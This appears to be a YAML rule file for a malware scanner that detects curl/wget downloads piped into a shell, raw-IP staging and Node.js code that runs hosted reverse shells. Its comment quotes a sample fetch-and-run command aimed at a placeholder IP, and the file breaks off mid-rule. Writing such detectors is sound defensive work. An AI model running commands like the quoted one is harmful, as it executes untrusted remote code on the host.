composite_rules:
  # A download piped into a shell where the source is a bare IPv4 address.
  #
  # The atoms in this file are all notable and the objectives-level ones anchor
  # the command at the start of a line -- deliberately, so documentation and API
  # examples that quote an install one-liner do not fire. The cost is that the
  # *executing* form is missed: in `system("curl -s http://<ip>/a.sh | sh")`,
  # `qx{...}`, `os.system(...)` or `execSync(...)` the command sits after a quote,
  # never at a line start. A Perl script doing exactly that scored risk 3 with
  # nothing above notable, while the same line in a shell file scores heavily.
  #
  # This composite recovers those cases from the other side -- the micro-behaviour
  # pipe atoms do fire on the embedded form -- and takes the *source address* as
  # the discriminator rather than the command shape. Vendor installers
  # (rustup.rs, get.docker.com, tailscale.com, astral.sh, ollama.com -- the
  # fifteen `not:` carve-outs on curl-pipe-sh) are all served from domains; an
  # implant staging from a hardcoded external IPv4 is not a distribution channel.
  # Measured over 108,671 text files under /usr/bin, /usr/share, /etc, /usr/lib,
  # /usr/sbin and /opt: zero files contain both a curl/wget pipe-to-shell and an
  # http://<ip> URL. `external-ipv4-http-url` also keeps RFC1918 out, so an
  # internal mirror at 10.x piping an install script is not a match.
  - id: ip-sourced-pipe-to-shell
    desc: Pipes a raw-IP download into a shell
    crit: suspicious
    conf: 0.93
    attack: T1105
    all:
      - id: micro-behaviors/communications/ip/literal::external-ipv4-http-url
    any:
      - id: micro-behaviors/process/create/shell/spawn::curl-pipe-exec-sh-node
      - id: micro-behaviors/process/create/system::python-curl-pipe-shell-call
      - id: curl-pipe-sh
      - id: curl-pipe-bash
      - id: wget-pipe-bash
  - id: raw-ip-wget-stdout-shell
    desc: Raw-IP wget stdout is piped into sh
    crit: hostile
    conf: 0.99
    attack: "T1105,T1059.004"
    all:
      - id: micro-behaviors/communications/ip/literal::external-ipv4-http-url
      - id: micro-behaviors/communications/http/download/curl::wget-cmd
      - id: micro-behaviors/communications/http/download/cli::wget-q-flag
      - id: micro-behaviors/communications/http/download/cli::wget-stdout-flag
      - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  - id: curl-pipe-shell-carveouts
    desc: Known recognized usages of curl-pipe-shell
    crit: notable
    conf: 0.9
    any:
      - id: well-known/dual-use/tunnel/tailscale::install-script-url
      - id: curl-pipe-shell-exception-ollama
      - id: curl-pipe-shell-exception-evil-sh
      - id: metadata/file/string/identity::abbreviated-curl-bash-reference
      - id: curl-pipe-shell-exception-phone-bridge
      - id: curl-pipe-shell-exception-into-bash
  - id: node-curl-pipe-shell-exec
    desc: Node.js executes curl pipe shell
    crit: hostile
    conf: 0.94
    attack: "T1105, T1059.004"
    mbc: "B0032.001"
    all:
      - id: micro-behaviors/process/create/shell/bridge::child-process-inline-exec-call
      - id: curl-pipe-interpreters
    any:
      - id: micro-behaviors/communications/ip/literal::http-ip-url
      - id: micro-behaviors/communications/ip/literal::malformed-http-ip-url
      - id: hosted-reverse-shell-service
  - id: node-hosted-reverse-shell-pipe
    desc: Node executes hosted reverse shell
    crit: hostile
    conf: 0.96
    attack: "T1105, T1059.004"
    mbc: "B0032.001"
    all:
      - id: micro-behaviors/process/create/shell/bridge::child-process-require
      - id: curl-pipe-shell
      - id: hosted-reverse-shell-service
  - id: node-hosted-reverse-shell-curl-pipe
    desc: Node executes hosted reverse shell service
    crit: hostile
    conf: 0.97
    attack: "T1105, T1059.004"
    mbc: "B0032.001"
    all:
      - id: micro-behaviors/process/create/shell/bridge::child-process-require
      - id: hosted-reverse-shell-service
    any:
      - id: curl-pipe-sh
      - id: curl-pipe-bash
      - id: curl-pipe-shell-word
      - id: curl-pipe-zsh
      - id: curl-pipe-ksh
      - id: curl-pipe-dash
      - id: micro-behaviors/communications/http/download/curl::curl-pipe-shell-in-js-exec
  - id: npm-curl-pipe-shell-stage
    desc: NPM package code executes a remote curl stage through a POSIX shell
    crit: hostile
    conf: 0.995
    for: [npm]
    attack: "T1195.002,T1105,T1059.004"
